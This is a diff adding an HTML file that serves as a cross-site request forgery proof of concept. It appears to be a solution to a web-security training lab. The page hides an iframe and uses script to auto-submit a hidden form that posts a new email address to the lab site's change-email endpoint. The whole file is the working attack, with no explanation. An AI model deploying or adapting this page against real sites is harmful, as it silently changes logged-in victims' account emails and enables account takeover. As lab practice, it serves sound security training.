@@ -1,0 +1,18 @@
+<html>
+    <body>
+        <h1>CSRF exploit running...</h1>
+        <iframe 
+        style="display: none;"
+        name="csrf-iframe"
+        ></iframe>
+
+        <form id="csrf-form"
+        action="https://0a0a00c704f48df7865a047700fc00b2.web-security-academy.net/my-account/change-email"
+        method="post"
+        target="csrf-iframe">
+            <input type="hidden" name="email" value="test1@tester.com"/>
+    </form>
+
+    <script>document.getElementById("csrf-form").submit()</script>
+    </body>
+</html>
